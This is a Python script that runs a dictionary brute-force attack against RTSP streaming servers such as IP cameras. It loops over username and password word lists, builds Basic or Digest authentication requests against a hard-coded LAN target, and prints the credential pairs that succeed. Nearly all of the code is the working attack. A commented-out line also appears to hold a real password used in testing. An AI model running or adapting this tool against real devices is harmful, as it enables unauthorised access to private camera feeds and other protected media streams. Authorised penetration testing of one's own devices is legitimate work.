#!/usr/bin/env python3 
# -*- coding:utf-8 -*-

import socket
import hashlib
import base64
import time



#define variables we need
global config_dict
config_dict = {
    "server_ip": "192.168.3.112",
    "server_port": 10554,
    "server_path": "/tcp/av0_0",
    "user_agent": "LibVLC/3.0.8 (LIVE555 Streaming Media v2016.11.28)",
    "buffer_len": 1024,
    "username_file": "username.txt",
    "password_file": "password.txt",
    # "brute_force_method": 'Basic'
    "brute_force_method": 'Digest'
}

# timeout = 1000
# socket.setdefaulttimeout(timeout)

socket_send = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_send.connect((config_dict["server_ip"], config_dict["server_port"]))



def gen_base_method_header(auth_64):
    global config_dict
    #build the prefix of msg to send
    str_base_method_header = 'DESCRIBE rtsp://'+config_dict["server_ip"]+':'+str(config_dict["server_port"])+config_dict["server_path"] + ' RTSP/1.0\r\n'
    str_base_method_header += 'CSeq: 4\r\n'
    str_base_method_header += 'User-Agent: '+config_dict["user_agent"]+'\r\n'
    str_base_method_header += 'Accept: application/sdp\r\n'
    str_base_method_header += 'Authorization: Basic '+auth_64 + ' \r\n'
    str_base_method_header += '\r\n'
    return str_base_method_header


def base_method_brute_force(socket_send,username,password):
    global config_dict
    # use base64 to encode username and password
    auth_64 = base64.b64encode((username + ":" + password).encode("utf-8")).decode()
    # try to auth server
    str_base_method_header = gen_base_method_header(auth_64)
    socket_send.send(str_base_method_header.encode())
    msg_recv = socket_send.recv(config_dict["buffer_len"]).decode()
    # if the server response '200 OK' It means the username and password pair is right
    if '200 OK' in msg_recv:
        print("found key --  " + username + ":" + password)


def gen_digest_describe_header():
    global config_dict
    str_digest_describe_header = 'DESCRIBE rtsp://'+config_dict["server_ip"]+':'+str(config_dict["server_port"])+config_dict["server_path"] + ' RTSP/1.0\r\n'
    str_digest_describe_header += 'CSeq: 4\r\n'
    str_digest_describe_header += 'User-Agent: '+config_dict["user_agent"]+'\r\n'
    str_digest_describe_header += 'Accept: application/sdp\r\n'
    str_digest_describe_header += '\r\n'
    return str_digest_describe_header


def gen_md5_response_value(url,username,password,realm,nonce):
    global config_dict
    frist_pre_md5_value = hashlib.md5((username + ':' + realm + ':' + password).encode()).hexdigest()
    first_post_md5_value = hashlib.md5(('DESCRIBE:' + url).encode()).hexdigest()
    response_value = hashlib.md5((frist_pre_md5_value + ':' + nonce + ':' + first_post_md5_value).encode()).hexdigest()
    return response_value

def gen_ansi_response_value(url,username,password,realm,nonce):
    global config_dict
    # frist_pre_md5_value = hashlib.md5((username + ':' + realm + ':' + password).encode()).hexdigest()
    first_post_md5_value = hashlib.md5(('DESCRIBE:' + url).encode()).hexdigest()
    response_value = hashlib.md5((password + ':' + nonce + ':' + first_post_md5_value).encode()).hexdigest()
    return response_value


def gen_digest_describe_auth_header(username,password,realm_value,nonce_value):
    global config_dict
    url = 'rtsp://' + config_dict['server_ip'] + ':' + str(config_dict['server_port']) + config_dict['server_path']
    response_value = gen_md5_response_value(url, username, password,realm_value, nonce_value)
    str_describe_auth_header = 'DESCRIBE rtsp://' + config_dict['server_ip'] + ':' + str(config_dict['server_port']) + \
                               config_dict['server_path'] + ' RTSP/1.0\r\n'
    str_describe_auth_header += 'CSeq: 5\r\n'
    str_describe_auth_header += 'Authorization: Digest username="' + username + '", realm="' + realm_value + '", nonce="' + nonce_value + '", uri="' + url + '", response="' + response_value + '"\r\n'
    str_describe_auth_header += 'User-Agent: ' + config_dict['user_agent'] + '\r\n'
    str_describe_auth_header += 'Accept: application/sdp\r\n'
    str_describe_auth_header += '\r\n'
    return str_describe_auth_header


def digest_method_brute_force(username,password,realm_value,nonce_value):
    global config_dict
    global socket_send
    str_digest_describe_auth_header = gen_digest_describe_auth_header(username,password,realm_value,nonce_value)
    # print(str_digest_describe_auth_header.encode())
    socket_send.send(str_digest_describe_auth_header.encode())
    print("send second describe:\n", str_digest_describe_auth_header.encode())
    msg_recv = socket_send.recv(config_dict['buffer_len']).decode()
    print('seconed msg_recv:\n',msg_recv)
    time.sleep(1)
    socket_send.close()
    if '200 OK' in msg_recv:
        print("found key --  " + username + ":" + password)
        socket_send = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_send.connect((config_dict["server_ip"], config_dict["server_port"]))
    # if len(msg_recv)==0:
    else:
        # pass
        socket_send = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_send.connect((config_dict["server_ip"], config_dict["server_port"]))







#decide use what method to brute force
def dict_attack():
    global socket_send
    if config_dict['brute_force_method'] == 'Basic':
        print('now use basic method to brute force')
        with open(config_dict["username_file"],"r") as usernames:
            for username in usernames:
                username = username.strip("\n")
                with open(config_dict["password_file"],"r") as passwords:
                    for password in passwords:
                        password = password.strip("\n")
                        base_method_brute_force(socket_send, username, password)
    else:
        print('now use digest method to brute force')
        with open(config_dict["username_file"], "r") as usernames:
            # print(usernames)
            for username in usernames:
                username = username.strip("\n")
                # print(username)
                with open(config_dict["password_file"], "r") as passwords:
                    for password in passwords:
                        password = password.strip("\n")
                        # print(password)
                        str_digest_describe_header = gen_digest_describe_header()
                        socket_send.send(str_digest_describe_header.encode())
                        print("send first describe:\n", str_digest_describe_header.encode())
                        msg_recv = socket_send.recv(config_dict['buffer_len']).decode()
                        print('first msg_recv:\n',msg_recv)
                        realm_pos = msg_recv.find('realm')
                        realm_value_begin_pos = msg_recv.find('"',realm_pos)+1
                        realm_value_end_pos = msg_recv.find('"',realm_pos+8)
                        realm_value = msg_recv[realm_value_begin_pos:realm_value_end_pos]
                        nonce_pos = msg_recv.find('nonce')
                        nonce_value_begin_pos = msg_recv.find('"',nonce_pos)+1
                        nonce_value_end_pos = msg_recv.find('"',nonce_pos+8)
                        nonce_value = msg_recv[nonce_value_begin_pos:nonce_value_end_pos]
                        digest_method_brute_force(username, password,realm_value,nonce_value)

if __name__=='__main__':
    # frist_pre_md5_value = hashlib.md5(('admin:RTSPD:wang19950208').encode()).hexdigest()
    # first_post_md5_value = hashlib.md5(('DESCRIBE:rtsp://192.168.3.112:105544/tcp/av0_0').encode()).hexdigest()
    # response_value = hashlib.md5((frist_pre_md5_value + ':' + '84t0p6t6w97o533i3yvm6521qyhxz9b7' + ':' + first_post_md5_value).encode()).hexdigest()
    # print( response_value)
    # create socket to server
    # global socket_send
    dict_attack()
    socket_send.close()